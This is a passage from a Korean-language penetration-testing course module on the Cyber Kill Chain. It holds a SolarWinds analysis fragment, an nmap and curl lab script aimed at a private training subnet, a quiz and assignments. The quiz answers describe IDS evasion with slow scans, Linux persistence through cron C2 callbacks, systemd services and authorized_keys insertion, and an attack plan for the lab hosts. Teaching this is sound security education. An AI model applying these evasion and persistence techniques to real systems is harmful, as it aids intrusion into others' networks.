   - 클라우드 환경(Azure AD, M365) 측면 이동
   - ATT&CK: T1606.002, T1114

================================================================
방어 실패 지점 분석:
- Stage 3: 코드 서명 검증만으로는 공급망 공격 차단 불가
- Stage 6: DNS→HTTPS 전환 시점을 놓침
- 교훈: "신뢰할 수 있는 소프트웨어"도 검증 필요
================================================================
ANALYSIS
```

## 실습 4.4: 킬체인 실습 환경 매핑

> **실습 목적**: 수업 실습 환경(10.20.30.0/24)을 대상으로 킬체인 7단계를 직접 매핑한다
>
> **배우는 것**: 실제 인프라에 킬체인을 적용하여 공격 경로를 계획하는 방법을 배운다
>
> **결과 해석**: 각 단계별 구체적인 명령과 도구가 매핑되면 완전한 공격 계획이 수립된 것이다
>
> **실전 활용**: 모의해킹 수행 전 킬체인 기반 공격 계획을 수립하는 데 활용한다
>
> **명령어 해설**: nmap으로 정찰하고 curl로 익스플로잇하는 전체 플로우를 보여준다
>
> **트러블슈팅**: 특정 서버에 접근이 안 되면 nftables 규칙과 서비스 상태를 확인한다

```bash
# 실습 환경 킬체인 매핑 실행
echo "=== 킬체인 Stage 1: 정찰 ==="
nmap -sn 10.20.30.0/24 2>/dev/null | grep "report\|Host is"

echo ""
echo "=== 킬체인 Stage 1: 서비스 열거 ==="
nmap -sV -p 22,80,443,3000,8002 10.20.30.80 2>/dev/null | grep "open\|closed"

echo ""
echo "=== 킬체인 Stage 4: 웹 취약점 확인 ==="
# Juice Shop 접근 가능 여부 확인
curl -s -o /dev/null -w "Juice Shop HTTP Status: %{http_code}\n" http://10.20.30.80:3000/ 2>/dev/null

echo ""
echo "=== 킬체인 Stage 7: 데이터 수집 대상 확인 ==="
# 어떤 데이터가 있는지 파악
curl -s http://10.20.30.80:3000/api/Products 2>/dev/null | python3 -c "
import sys,json
try:
    data=json.load(sys.stdin)
    print(f'제품 데이터: {data.get(\"status\",\"N/A\")} (항목 수: {len(data.get(\"data\",[]))})')
except: print('데이터 접근 불가')" 2>/dev/null

echo ""
echo "[킬체인 매핑 완료 - 각 단계별 공격 경로 확인됨]"
```

---

## 검증 체크리스트

실습 완료 후 다음 항목을 확인하라:

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | 킬체인 7단계 이해 | 구두 설명 | 각 단계 30초 이내 설명 가능 |
| 2 | APT 그룹 사례 매핑 | 분석 문서 | 최소 3개 그룹 킬체인 매핑 |
| 3 | 저속 스캔 실행 | nmap --scan-delay | 정상 결과 + IDS 미탐지 |
| 4 | Suricata 탐지 확인 | fast.log 확인 | 일반 스캔 알림 존재 |
| 5 | C2 시뮬레이션 | HTTP 비콘 | 3회 폴링 성공 |
| 6 | DNS C2 원리 이해 | 인코딩 결과 | base64 인코딩 변환 성공 |
| 7 | SolarWinds 매핑 | 분석 결과 | 7단계 모두 매핑 |
| 8 | 실습환경 매핑 | nmap + curl | 4개 호스트 식별 |
| 9 | 지속성 기법 이해 | 체크리스트 | 5개 이상 기법 설명 |
| 10 | 방어 포인트 식별 | 구두 설명 | 단계별 차단 수단 제시 |

---

## 자가 점검 퀴즈

**Q1.** Cyber Kill Chain의 7단계를 순서대로 나열하라.

<details><summary>정답</summary>
1. Reconnaissance(정찰) → 2. Weaponization(무기화) → 3. Delivery(전달) → 4. Exploitation(익스플로잇) → 5. Installation(설치) → 6. Command and Control(C2) → 7. Actions on Objectives(목표 행동)
</details>

**Q2.** APT의 'P'(Persistent)가 의미하는 바와, 이를 위해 공격자가 사용하는 킬체인 단계는?

<details><summary>정답</summary>
Persistent(지속적)는 장기간 잠복하며 반복적으로 접근하는 것을 의미한다. 이를 위해 주로 Stage 5(Installation)에서 지속성 메커니즘(크론잡, 서비스, SSH 키 등)을 설치한다.
</details>

**Q3.** SolarWinds 공격에서 전달(Delivery) 단계가 특별한 이유는?

<details><summary>정답</summary>
정상적인 소프트웨어 업데이트 채널을 통해 배포되었으며, 합법적인 코드 서명 인증서가 사용되어 기존 보안 솔루션으로는 탐지가 거의 불가능했다. 이것이 공급망 공격(Supply Chain Attack)의 위험성이다.
</details>

**Q4.** nmap -T0 옵션이 APT 정찰에서 유용한 이유는?

<details><summary>정답</summary>
-T0(paranoid)은 패킷 전송 간격을 5분으로 설정하여 IDS/IPS의 시간 기반 탐지 임계값(예: 1분 내 10회 이상 연결 시도)을 회피할 수 있다. 느리지만 탐지 확률이 현저히 낮아진다.
</details>

**Q5.** DNS 터널링 C2의 탐지 포인트 3가지를 설명하라.

<details><summary>정답</summary>
1. 비정상적으로 긴 서브도메인(30자 이상) - 데이터 인코딩 때문
2. 높은 빈도의 TXT 레코드 쿼리 - 응답 크기가 크므로 TXT 선호
3. 존재하지 않는 도메인에 대한 반복 쿼리 - C2 도메인은 보통 새로 등록됨
</details>

**Q6.** Unified Kill Chain이 기존 Cyber Kill Chain을 확장한 주요 영역은?

<details><summary>정답</summary>
내부 이동(Network Propagation) 단계를 세분화하여 권한 상승, 측면 이동, 크레덴셜 접근, 피봇팅 등을 명시적으로 포함시켰다. 기존 킬체인은 초기 침투에 초점이 맞춰져 있어 내부 활동 분석에 부족했다.
</details>

**Q7.** Diamond Model의 4가지 요소를 나열하고, APT28 DNC 해킹에 각각 매핑하라.

<details><summary>정답</summary>
- Adversary: APT28 (Fancy Bear, 러시아 GRU)
- Capability: X-Agent RAT, 스피어피싱 이메일
- Infrastructure: dcleaks.com, 위장 도메인
- Victim: 미국 민주당 전국위원회(DNC)
</details>

**Q8.** 킬체인 Stage 5에서 Linux 시스템에 지속성을 확보하는 기법 3가지를 설명하라.

<details><summary>정답</summary>
1. crontab 등록: 주기적으로 C2 콜백 스크립트 실행
2. systemd 서비스: 악성 바이너리를 시스템 서비스로 등록하여 부팅 시 자동 실행
3. SSH authorized_keys: 공격자의 공개키를 삽입하여 비밀번호 없이 SSH 접속
</details>

**Q9.** "킬체인을 끊어라"의 의미와, 가장 효과적인 차단 단계는?

<details><summary>정답</summary>
7단계 중 어느 한 단계라도 차단하면 전체 공격이 실패한다는 원리이다. 가장 효과적인 차단 단계는 Stage 3(전달)과 Stage 6(C2)이다. 전달을 차단하면 악성코드가 도달하지 못하고, C2를 차단하면 공격자가 감염된 시스템을 제어할 수 없다.
</details>

**Q10.** 실습 환경(10.20.30.0/24)에서 킬체인을 완성하려면 각 단계에서 어떤 서버를 대상으로 해야 하는지 매핑하라.

<details><summary>정답</summary>
1. 정찰: 전체 네트워크(10.20.30.0/24) → 4개 호스트 발견
2. 무기화: opsclaw(10.20.30.201)에서 페이로드 제작
3. 전달: web(10.20.30.80)의 Juice Shop을 통한 웹 기반 전달
4. 익스플로잇: web의 SQL Injection 등 취약점 활용
5. 설치: web에서 지속성 확보 후 내부망 접근
6. C2: opsclaw을 C2 서버로 사용, web에서 비콘 수립
7. 목표 행동: siem(10.20.30.100)의 로그 데이터, secu(10.20.30.1)의 방화벽 규칙 탈취
</details>

---

## 과제

### 과제 1: APT 킬체인 보고서 (개인)
실제 APT 그룹(APT28, APT29, Lazarus, Kimsuky 중 택 1)의 공격 캠페인을 선택하여 Cyber Kill Chain 7단계에 매핑하는 보고서를 작성하라. 각 단계에 해당하는 MITRE ATT&CK 기법 ID를 포함할 것.

### 과제 2: 방어 매트릭스 작성 (팀)
킬체인 7단계 각각에 대해 탐지(Detect), 거부(Deny), 방해(Disrupt), 저하(Degrade), 기만(Deceive), 파괴(Destroy) 6가지 방어 행동을 매핑하는 매트릭스를 작성하라. 실습 환경의 실제 도구(Suricata, Wazuh, nftables)를 활용한 구체적인 방어 수단을 포함할 것.

### 과제 3: 킬체인 시뮬레이션 계획 (팀)
실습 환경(10.20.30.0/24)을 대상으로 전체 킬체인을 수행하는 시뮬레이션 계획서를 작성하라. 각 단계에서 사용할 구체적인 도구, 명령어, 예상 결과를 포함할 것. 이 계획은 Week 14(종합 모의해킹)에서 실행할 기초가 된다.
